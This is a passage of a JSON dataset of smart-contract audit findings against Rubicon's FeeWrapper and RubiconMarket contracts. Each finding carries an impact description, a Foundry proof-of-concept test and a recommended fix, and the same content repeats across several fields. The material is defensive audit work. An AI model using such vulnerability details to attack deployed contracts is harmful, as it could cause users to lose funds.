calls behave differently than function calls in Solidity. Calls at the EVM level to accounts with no code are successful, this is the expected and normal behavior. It is Solidity that adds checks to prevent accidental calls to accounts with no code while compiling code for normal function calls.\n\nThis means that if the target account has no code, then the wrapped call using the FeeWrapper contract will succeed and the operation will be executed successfully. An accidental mistake may go unnoticed and may also cause unexpected loss of funds, as this call may include call value for transferring ETH.\n",
        "recommendation": "## Recommendation\n\nWhile executing low level calls, the `_rubicall` and `_rubicallPayable` functions should check that either the account has code or the return data is greater than zero (which indicates the presence of an implementation). The OpenZeppelin contracts library provides utilities to execute low level calls in a safe way, including the recommended checks, present in the Address library, [functionCall](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-) and [functionCallWithValue](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-).\n",
        "poc": "## Proof of Concept\n\nIn the following test, we use the FeeWrapper contract to execute a call to an account with no code. The transaction will succeed and the ETH will be transferred to the target account.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_CallsToAccountsNoCodeSucceed() public {\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = bytes4(0x01020304);\n    callParams.args = abi.encode(uint256(42));\n    callParams.target = makeAddr(\"address with no code\");\n    callParams.feeParams.totalAmount = 0.1 ether;\n    callParams.feeParams.feeAmount = 0.01 ether;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // Target has no code\n    assertEq(callParams.target.code.length, 0);\n\n    // Call succeeds even though the target has no code and no implementation\n    feeWrapper.rubicall{value: 0.1 ether}(callParams);\n}\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n\n# Vulnerability details\n\n## Impact\n\nThe FeeWrapper contract wraps calls to an arbitrary target contract to add support for fees. The implementation executes a low level call to proxy the call to the target contract. This can be seen in the `_rubicall` and `_rubicallPayable` functions:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n```solidity\n60:     function _rubicall(\n61:         CallParams memory _params\n62:     ) internal returns (bytes memory) {\n63:         // charge fee from feeParams\n64:         _chargeFee(_params.feeParams, _params.target);\n65:\n66:         (bool _OK, bytes memory _data) = _params.target.call(\n67:             bytes.concat(_params.selector, _params.args)\n68:         );\n69:\n70:         require(_OK, \"low-level call to the Rubicon failed\");\n71:\n72:         return _data;\n73:     }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81:\n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85:\n86:         require(_OK, \"low-level call to the router failed\");\n87:\n88:         return _data;\n89:     }\n```\n\nLow level calls behave differently than function calls in Solidity. Calls at the EVM level to accounts with no code are successful, this is the expected and normal behavior. It is Solidity that adds checks to prevent accidental calls to accounts with no code while compiling code for normal function calls.\n\nThis means that if the target account has no code, then the wrapped call using the FeeWrapper contract will succeed and the operation will be executed successfully. An accidental mistake may go unnoticed and may also cause unexpected loss of funds, as this call may include call value for transferring ETH.\n\n## Proof of Concept\n\nIn the following test, we use the FeeWrapper contract to execute a call to an account with no code. The transaction will succeed and the ETH will be transferred to the target account.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_CallsToAccountsNoCodeSucceed() public {\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = bytes4(0x01020304);\n    callParams.args = abi.encode(uint256(42));\n    callParams.target = makeAddr(\"address with no code\");\n    callParams.feeParams.totalAmount = 0.1 ether;\n    callParams.feeParams.feeAmount = 0.01 ether;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // Target has no code\n    assertEq(callParams.target.code.length, 0);\n\n    // Call succeeds even though the target has no code and no implementation\n    feeWrapper.rubicall{value: 0.1 ether}(callParams);\n}\n```\n\n## Recommendation\n\nWhile executing low level calls, the `_rubicall` and `_rubicallPayable` functions should check that either the account has code or the return data is greater than zero (which indicates the presence of an implementation). The OpenZeppelin contracts library provides utilities to execute low level calls in a safe way, including the recommended checks, present in the Address library, [functionCall](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCall-address-bytes-) and [functionCallWithValue](https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-).\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1301,
      "page_start": null,
      "heading": "1301. FeeWrapper fails to handle ETH payment refunds",
      "heading_cleaned": "FeeWrapper fails to handle ETH payment refunds",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L8\n\n\n# Vulnerability details\n\n## Impact\n\nThe FeeWrapper contract can be used to wrap calls that include ETH payments. This is handled by the `_rubicallPayable` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81:\n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85:\n86:         require(_OK, \"low-level call to the router failed\");\n87:\n88:         return _data;\n89:     }\n```\n\nAs we can see in the previous snippet, the implementation will forward the ETH payment (minus fees) to the target contract. If the target contract ends up using less ETH than the sent amount, then the usual approach would be to refund the remaining ETH back to the caller, which is a normal and common operation.\n\nIf this is the case, then the wrapped call will fail as the FeeWrapper doesn't implement the `receive` or `fallback` function to allow ETH payments. Even though there is no loss of funds as the transaction is reverted, the issue will prevent users from wrapping calls to target contracts that may refund ETH as part of their normal behavior.\n\nAs a potential real example, we can the explore the `buyAllAmountWithETH` function present in the `RubiconRouter` contract:\n\nhttps://github.com/RubiconDeFi/rubi-protocol-v2/blob/master/contracts/utilities/RubiconRouter.sol#L379-L418\n\n```solidity\n379:     function buyAllAmountWithETH(\n380:         ERC20 buy_gem,\n381:         uint256 buy_amt,\n382:         uint256 max_fill_amount\n383:     ) external payable beGoneReentrantScum returns (uint256 fill) {\n384:         address _weth = address(wethAddress);\n385:         uint256 _before = ERC20(_weth).balanceOf(address(this));\n386:         require(\n387:             msg.value == max_fill_amount,\n388:             \"must send as much ETH as max_fill_amount\"\n389:         );\n390:         IWETH(wethAddress).deposit{value: max_fill_amount}(); // Pay with native ETH -> WETH\n391:\n392:         if (\n393:             IWETH(wethAddress).allowance(address(this), RubiconMarketAddress) <\n394:             max_fill_amount\n395:         ) {\n396:             approveAssetOnMarket(wethAddress);\n397:         }\n398:\n399:         // An amount in WETH\n400:         fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n401:             buy_gem,\n402:             buy_amt,\n403:             ERC20(wethAddress),\n404:             max_fill_amount\n405:         );\n406:         IERC20(buy_gem).safeTransfer(msg.sender, fill);\n407:\n408:         uint256 _after = ERC20(_weth).balanceOf(address(this));\n409:         uint256 delta = _after - _before;\n410:\n411:         // Return unspent coins to sender\n412:         if (delta > 0) {\n413:             IWETH(wethAddress).withdraw(delta);\n414:             // msg.sender.transfer(delta);\n415:             (bool success, ) = msg.sender.call{value: delta}(\"\");\n416:             require(success, \"Transfer failed.\");\n417:         }\n418:     }\n```\n\nAs we can see in the previous snippet, the function will potentially refund the caller the unspent ETH in lines 412-417. If this call is being wrapped using the FeeWrapper, then `msg.sender` will be the FeeWrapper contract.\n\n## Proof of Concept\n\nIn the following test we create a demonstration contract `FeeWrapperTarget` which includes a function named `demoETH` that will refund half of the sent amount back to the caller. The wrapped call will fail, as the `FeeWrapperTarget` will try to refund the ETH to the `FeeWrapper` which doesn't allow ETH payments, causing the whole transaction to be reverted.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_FailsWithETHRefund() public {\n    FeeWrapperTarget target = new FeeWrapperTarget(ERC20(address(0)));\n\n    uint256 amount = 1 ether;\n    uint256 fee = 0.1 ether;\n\n    vm.deal(alice, amount + fee);\n\n    // Alice will call demoERC20\n    vm.startPrank(alice);\n\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = FeeWrapperTarget.demoETH.selector;\n    callParams.args = \"\";\n    callParams.target = address(target);\n    callParams.feeParams.feeToken = address(0);\n    callParams.feeParams.totalAmount = amount + fee;\n    callParams.feeParams.feeAmount = fee;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // The following call will fail, the FeeWrapper contract is not prepared to receive the ETH from the target contract\n    vm.expectRevert(\"low-level call to the router failed\");\n    feeWrapper.rubicall{value: amount + fee}(callParams);\n\n    vm.stopPrank();\n}\n```\n\n## Recommendation\n\nAllow the FeeWrapper contract to receive ETH by implementing the `receive` function. After the call to the target contract, refund any ETH amount present in the FeeWrapper contract back to the original caller.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L8\n\n\n# Vulnerability details\n\n## Impact\n\nThe FeeWrapper contract can be used to wrap calls that include ETH payments. This is handled by the `_rubicallPayable` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81: \n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85: \n86:         require(_OK, \"low-level call to the router failed\");\n87: \n88:         return _data;\n89:     }\n```\n\nAs we can see in the previous snippet, the implementation will forward the ETH payment (minus fees) to the target contract. If the target contract ends up using less ETH than the sent amount, then the usual approach would be to refund the remaining ETH back to the caller, which is a normal and common operation.\n\nIf this is the case, then the wrapped call will fail as the FeeWrapper doesn't implement the `receive` or `fallback` function to allow ETH payments. Even though there is no loss of funds as the transaction is reverted, the issue will prevent users from wrapping calls to target contracts that may refund ETH as part of their normal behavior.\n\nAs a potential real example, we can the explore the `buyAllAmountWithETH` function present in the `RubiconRouter` contract:\n\nhttps://github.com/RubiconDeFi/rubi-protocol-v2/blob/master/contracts/utilities/RubiconRouter.sol#L379-L418\n\n```solidity\n379:     function buyAllAmountWithETH(\n380:         ERC20 buy_gem,\n381:         uint256 buy_amt,\n382:         uint256 max_fill_amount\n383:     ) external payable beGoneReentrantScum returns (uint256 fill) {\n384:         address _weth = address(wethAddress);\n385:         uint256 _before = ERC20(_weth).balanceOf(address(this));\n386:         require(\n387:             msg.value == max_fill_amount,\n388:             \"must send as much ETH as max_fill_amount\"\n389:         );\n390:         IWETH(wethAddress).deposit{value: max_fill_amount}(); // Pay with native ETH -> WETH\n391: \n392:         if (\n393:             IWETH(wethAddress).allowance(address(this), RubiconMarketAddress) <\n394:             max_fill_amount\n395:         ) {\n396:             approveAssetOnMarket(wethAddress);\n397:         }\n398: \n399:         // An amount in WETH\n400:         fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n401:             buy_gem,\n402:             buy_amt,\n403:             ERC20(wethAddress),\n404:             max_fill_amount\n405:         );\n406:         IERC20(buy_gem).safeTransfer(msg.sender, fill);\n407: \n408:         uint256 _after = ERC20(_weth).balanceOf(address(this));\n409:         uint256 delta = _after - _before;\n410: \n411:         // Return unspent coins to sender\n412:         if (delta > 0) {\n413:             IWETH(wethAddress).withdraw(delta);\n414:             // msg.sender.transfer(delta);\n415:             (bool success, ) = msg.sender.call{value: delta}(\"\");\n416:             require(success, \"Transfer failed.\");\n417:         }\n418:     }\n```\n\nAs we can see in the previous snippet, the function will potentially refund the caller the unspent ETH in lines 412-417. If this call is being wrapped using the FeeWrapper, then `msg.sender` will be the FeeWrapper contract.\n\n## Proof of Concept\n\nIn the following test we create a demonstration contract `FeeWrapperTarget` which includes a function named `demoETH` that will refund half of the sent amount back to the caller. The wrapped call will fail, as the `FeeWrapperTarget` will try to refund the ETH to the `FeeWrapper` which doesn't allow ETH payments, causing the whole transaction to be reverted.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_FailsWithETHRefund() public {\n    FeeWrapperTarget target = new FeeWrapperTarget(ERC20(address(0)));\n\n    uint256 amount = 1 ether;\n    uint256 fee = 0.1 ether;\n\n    vm.deal(alice, amount + fee);\n\n    // Alice will call demoERC20\n    vm.startPrank(alice);\n\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = FeeWrapperTarget.demoETH.selector;\n    callParams.args = \"\";\n    callParams.target = address(target);\n    callParams.feeParams.feeToken = address(0);\n    callParams.feeParams.totalAmount = amount + fee;\n    callParams.feeParams.feeAmount = fee;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // The following call will fail, the FeeWrapper contract is not prepared to receive the ETH from the target contract\n    vm.expectRevert(\"low-level call to the router failed\");\n    feeWrapper.rubicall{value: amount + fee}(callParams);\n\n    vm.stopPrank();\n}\n```\n\n## Recommendation\n\nAllow the FeeWrapper contract to receive ETH by implementing the `receive` function. After the call to the target contract, refund any ETH amount present in the FeeWrapper contract back to the original caller.\n",
      "description": null,
      "impact": "## Impact\n\nThe FeeWrapper contract can be used to wrap calls that include ETH payments. This is handled by the `_rubicallPayable` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81:\n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85:\n86:         require(_OK, \"low-level call to the router failed\");\n87:\n88:         return _data;\n89:     }\n```\n\nAs we can see in the previous snippet, the implementation will forward the ETH payment (minus fees) to the target contract. If the target contract ends up using less ETH than the sent amount, then the usual approach would be to refund the remaining ETH back to the caller, which is a normal and common operation.\n\nIf this is the case, then the wrapped call will fail as the FeeWrapper doesn't implement the `receive` or `fallback` function to allow ETH payments. Even though there is no loss of funds as the transaction is reverted, the issue will prevent users from wrapping calls to target contracts that may refund ETH as part of their normal behavior.\n\nAs a potential real example, we can the explore the `buyAllAmountWithETH` function present in the `RubiconRouter` contract:\n\nhttps://github.com/RubiconDeFi/rubi-protocol-v2/blob/master/contracts/utilities/RubiconRouter.sol#L379-L418\n\n```solidity\n379:     function buyAllAmountWithETH(\n380:         ERC20 buy_gem,\n381:         uint256 buy_amt,\n382:         uint256 max_fill_amount\n383:     ) external payable beGoneReentrantScum returns (uint256 fill) {\n384:         address _weth = address(wethAddress);\n385:         uint256 _before = ERC20(_weth).balanceOf(address(this));\n386:         require(\n387:             msg.value == max_fill_amount,\n388:             \"must send as much ETH as max_fill_amount\"\n389:         );\n390:         IWETH(wethAddress).deposit{value: max_fill_amount}(); // Pay with native ETH -> WETH\n391:\n392:         if (\n393:             IWETH(wethAddress).allowance(address(this), RubiconMarketAddress) <\n394:             max_fill_amount\n395:         ) {\n396:             approveAssetOnMarket(wethAddress);\n397:         }\n398:\n399:         // An amount in WETH\n400:         fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n401:             buy_gem,\n402:             buy_amt,\n403:             ERC20(wethAddress),\n404:             max_fill_amount\n405:         );\n406:         IERC20(buy_gem).safeTransfer(msg.sender, fill);\n407:\n408:         uint256 _after = ERC20(_weth).balanceOf(address(this));\n409:         uint256 delta = _after - _before;\n410:\n411:         // Return unspent coins to sender\n412:         if (delta > 0) {\n413:             IWETH(wethAddress).withdraw(delta);\n414:             // msg.sender.transfer(delta);\n415:             (bool success, ) = msg.sender.call{value: delta}(\"\");\n416:             require(success, \"Transfer failed.\");\n417:         }\n418:     }\n```\n\nAs we can see in the previous snippet, the function will potentially refund the caller the unspent ETH in lines 412-417. If this call is being wrapped using the FeeWrapper, then `msg.sender` will be the FeeWrapper contract.\n",
      "mitigation": "## Recommendation\n\nAllow the FeeWrapper contract to receive ETH by implementing the `receive` function. After the call to the target contract, refund any ETH amount present in the FeeWrapper contract back to the original caller.\n",
      "poc": "## Proof of Concept\n\nIn the following test we create a demonstration contract `FeeWrapperTarget` which includes a function named `demoETH` that will refund half of the sent amount back to the caller. The wrapped call will fail, as the `FeeWrapperTarget` will try to refund the ETH to the `FeeWrapper` which doesn't allow ETH payments, causing the whole transaction to be reverted.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_FailsWithETHRefund() public {\n    FeeWrapperTarget target = new FeeWrapperTarget(ERC20(address(0)));\n\n    uint256 amount = 1 ether;\n    uint256 fee = 0.1 ether;\n\n    vm.deal(alice, amount + fee);\n\n    // Alice will call demoERC20\n    vm.startPrank(alice);\n\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = FeeWrapperTarget.demoETH.selector;\n    callParams.args = \"\";\n    callParams.target = address(target);\n    callParams.feeParams.feeToken = address(0);\n    callParams.feeParams.totalAmount = amount + fee;\n    callParams.feeParams.feeAmount = fee;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // The following call will fail, the FeeWrapper contract is not prepared to receive the ETH from the target contract\n    vm.expectRevert(\"low-level call to the router failed\");\n    feeWrapper.rubicall{value: amount + fee}(callParams);\n\n    vm.stopPrank();\n}\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L8\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nThe FeeWrapper contract can be used to wrap calls that include ETH payments. This is handled by the `_rubicallPayable` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81:\n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85:\n86:         require(_OK, \"low-level call to the router failed\");\n87:\n88:         return _data;\n89:     }\n```\n\nAs we can see in the previous snippet, the implementation will forward the ETH payment (minus fees) to the target contract. If the target contract ends up using less ETH than the sent amount, then the usual approach would be to refund the remaining ETH back to the caller, which is a normal and common operation.\n\nIf this is the case, then the wrapped call will fail as the FeeWrapper doesn't implement the `receive` or `fallback` function to allow ETH payments. Even though there is no loss of funds as the transaction is reverted, the issue will prevent users from wrapping calls to target contracts that may refund ETH as part of their normal behavior.\n\nAs a potential real example, we can the explore the `buyAllAmountWithETH` function present in the `RubiconRouter` contract:\n\nhttps://github.com/RubiconDeFi/rubi-protocol-v2/blob/master/contracts/utilities/RubiconRouter.sol#L379-L418\n\n```solidity\n379:     function buyAllAmountWithETH(\n380:         ERC20 buy_gem,\n381:         uint256 buy_amt,\n382:         uint256 max_fill_amount\n383:     ) external payable beGoneReentrantScum returns (uint256 fill) {\n384:         address _weth = address(wethAddress);\n385:         uint256 _before = ERC20(_weth).balanceOf(address(this));\n386:         require(\n387:             msg.value == max_fill_amount,\n388:             \"must send as much ETH as max_fill_amount\"\n389:         );\n390:         IWETH(wethAddress).deposit{value: max_fill_amount}(); // Pay with native ETH -> WETH\n391:\n392:         if (\n393:             IWETH(wethAddress).allowance(address(this), RubiconMarketAddress) <\n394:             max_fill_amount\n395:         ) {\n396:             approveAssetOnMarket(wethAddress);\n397:         }\n398:\n399:         // An amount in WETH\n400:         fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n401:             buy_gem,\n402:             buy_amt,\n403:             ERC20(wethAddress),\n404:             max_fill_amount\n405:         );\n406:         IERC20(buy_gem).safeTransfer(msg.sender, fill);\n407:\n408:         uint256 _after = ERC20(_weth).balanceOf(address(this));\n409:         uint256 delta = _after - _before;\n410:\n411:         // Return unspent coins to sender\n412:         if (delta > 0) {\n413:             IWETH(wethAddress).withdraw(delta);\n414:             // msg.sender.transfer(delta);\n415:             (bool success, ) = msg.sender.call{value: delta}(\"\");\n416:             require(success, \"Transfer failed.\");\n417:         }\n418:     }\n```\n\nAs we can see in the previous snippet, the function will potentially refund the caller the unspent ETH in lines 412-417. If this call is being wrapped using the FeeWrapper, then `msg.sender` will be the FeeWrapper contract.\n",
        "recommendation": "## Recommendation\n\nAllow the FeeWrapper contract to receive ETH by implementing the `receive` function. After the call to the target contract, refund any ETH amount present in the FeeWrapper contract back to the original caller.\n",
        "poc": "## Proof of Concept\n\nIn the following test we create a demonstration contract `FeeWrapperTarget` which includes a function named `demoETH` that will refund half of the sent amount back to the caller. The wrapped call will fail, as the `FeeWrapperTarget` will try to refund the ETH to the `FeeWrapper` which doesn't allow ETH payments, causing the whole transaction to be reverted.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_FailsWithETHRefund() public {\n    FeeWrapperTarget target = new FeeWrapperTarget(ERC20(address(0)));\n\n    uint256 amount = 1 ether;\n    uint256 fee = 0.1 ether;\n\n    vm.deal(alice, amount + fee);\n\n    // Alice will call demoERC20\n    vm.startPrank(alice);\n\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = FeeWrapperTarget.demoETH.selector;\n    callParams.args = \"\";\n    callParams.target = address(target);\n    callParams.feeParams.feeToken = address(0);\n    callParams.feeParams.totalAmount = amount + fee;\n    callParams.feeParams.feeAmount = fee;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // The following call will fail, the FeeWrapper contract is not prepared to receive the ETH from the target contract\n    vm.expectRevert(\"low-level call to the router failed\");\n    feeWrapper.rubicall{value: amount + fee}(callParams);\n\n    vm.stopPrank();\n}\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L8\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L8\n\n\n# Vulnerability details\n\n## Impact\n\nThe FeeWrapper contract can be used to wrap calls that include ETH payments. This is handled by the `_rubicallPayable` function:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L76-L89\n\n```solidity\n76:     function _rubicallPayable(\n77:         CallParams memory _params\n78:     ) internal returns (bytes memory) {\n79:         // charge fee from feeParams\n80:         uint256 _msgValue = _chargeFeePayable(_params.feeParams);\n81:\n82:         (bool _OK, bytes memory _data) = _params.target.call{value: _msgValue}(\n83:             bytes.concat(_params.selector, _params.args)\n84:         );\n85:\n86:         require(_OK, \"low-level call to the router failed\");\n87:\n88:         return _data;\n89:     }\n```\n\nAs we can see in the previous snippet, the implementation will forward the ETH payment (minus fees) to the target contract. If the target contract ends up using less ETH than the sent amount, then the usual approach would be to refund the remaining ETH back to the caller, which is a normal and common operation.\n\nIf this is the case, then the wrapped call will fail as the FeeWrapper doesn't implement the `receive` or `fallback` function to allow ETH payments. Even though there is no loss of funds as the transaction is reverted, the issue will prevent users from wrapping calls to target contracts that may refund ETH as part of their normal behavior.\n\nAs a potential real example, we can the explore the `buyAllAmountWithETH` function present in the `RubiconRouter` contract:\n\nhttps://github.com/RubiconDeFi/rubi-protocol-v2/blob/master/contracts/utilities/RubiconRouter.sol#L379-L418\n\n```solidity\n379:     function buyAllAmountWithETH(\n380:         ERC20 buy_gem,\n381:         uint256 buy_amt,\n382:         uint256 max_fill_amount\n383:     ) external payable beGoneReentrantScum returns (uint256 fill) {\n384:         address _weth = address(wethAddress);\n385:         uint256 _before = ERC20(_weth).balanceOf(address(this));\n386:         require(\n387:             msg.value == max_fill_amount,\n388:             \"must send as much ETH as max_fill_amount\"\n389:         );\n390:         IWETH(wethAddress).deposit{value: max_fill_amount}(); // Pay with native ETH -> WETH\n391:\n392:         if (\n393:             IWETH(wethAddress).allowance(address(this), RubiconMarketAddress) <\n394:             max_fill_amount\n395:         ) {\n396:             approveAssetOnMarket(wethAddress);\n397:         }\n398:\n399:         // An amount in WETH\n400:         fill = RubiconMarket(RubiconMarketAddress).buyAllAmount(\n401:             buy_gem,\n402:             buy_amt,\n403:             ERC20(wethAddress),\n404:             max_fill_amount\n405:         );\n406:         IERC20(buy_gem).safeTransfer(msg.sender, fill);\n407:\n408:         uint256 _after = ERC20(_weth).balanceOf(address(this));\n409:         uint256 delta = _after - _before;\n410:\n411:         // Return unspent coins to sender\n412:         if (delta > 0) {\n413:             IWETH(wethAddress).withdraw(delta);\n414:             // msg.sender.transfer(delta);\n415:             (bool success, ) = msg.sender.call{value: delta}(\"\");\n416:             require(success, \"Transfer failed.\");\n417:         }\n418:     }\n```\n\nAs we can see in the previous snippet, the function will potentially refund the caller the unspent ETH in lines 412-417. If this call is being wrapped using the FeeWrapper, then `msg.sender` will be the FeeWrapper contract.\n\n## Proof of Concept\n\nIn the following test we create a demonstration contract `FeeWrapperTarget` which includes a function named `demoETH` that will refund half of the sent amount back to the caller. The wrapped call will fail, as the `FeeWrapperTarget` will try to refund the ETH to the `FeeWrapper` which doesn't allow ETH payments, causing the whole transaction to be reverted.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_FeeWrapper_FailsWithETHRefund() public {\n    FeeWrapperTarget target = new FeeWrapperTarget(ERC20(address(0)));\n\n    uint256 amount = 1 ether;\n    uint256 fee = 0.1 ether;\n\n    vm.deal(alice, amount + fee);\n\n    // Alice will call demoERC20\n    vm.startPrank(alice);\n\n    FeeWrapper.CallParams memory callParams;\n    callParams.selector = FeeWrapperTarget.demoETH.selector;\n    callParams.args = \"\";\n    callParams.target = address(target);\n    callParams.feeParams.feeToken = address(0);\n    callParams.feeParams.totalAmount = amount + fee;\n    callParams.feeParams.feeAmount = fee;\n    callParams.feeParams.feeTo = makeAddr(\"FeeRecipient\");\n\n    // The following call will fail, the FeeWrapper contract is not prepared to receive the ETH from the target contract\n    vm.expectRevert(\"low-level call to the router failed\");\n    feeWrapper.rubicall{value: amount + fee}(callParams);\n\n    vm.stopPrank();\n}\n```\n\n## Recommendation\n\nAllow the FeeWrapper contract to receive ETH by implementing the `receive` function. After the call to the target contract, refund any ETH amount present in the FeeWrapper contract back to the original caller.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1312,
      "page_start": null,
      "heading": "1312. Fee inclusivity calculations are inaccurate in RubiconMarket",
      "heading_cleaned": "Fee inclusivity calculations are inaccurate in RubiconMarket",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L578-L589\n\n\n# Vulnerability details\n\n## Impact\n\nTrading in the RubiconMarket has associated fee costs that are paid by the taker of the offer. These fees include the protocol fee and a new \"maker fee\" introduced in v2. Fees are pulled from the taker (caller of the function) independently of the trade amount, which means fees are not included in the trade amount. These are implemented in the `buy` function of the base contract `SimpleMarket`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L337-L373\n\n```solidity\n337:         /// @dev Fee logic added on taker trades\n338:         uint256 fee = mul(spend, feeBPS) / 100_000;\n339:         require(\n340:             _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n341:             \"Insufficient funds to cover fee\"\n342:         );\n343:\n344:         // taker pay maker 0_0\n345:         if (makerFee() > 0) {\n346:             uint256 mFee = mul(spend, makerFee()) / 100_000;\n347:\n348:             /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n349:             if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n350:                 require(\n351:                     _offer.buy_gem.transferFrom(\n352:                         msg.sender,\n353:                         _offer.recipient,\n354:                         mFee\n355:                     ),\n356:                     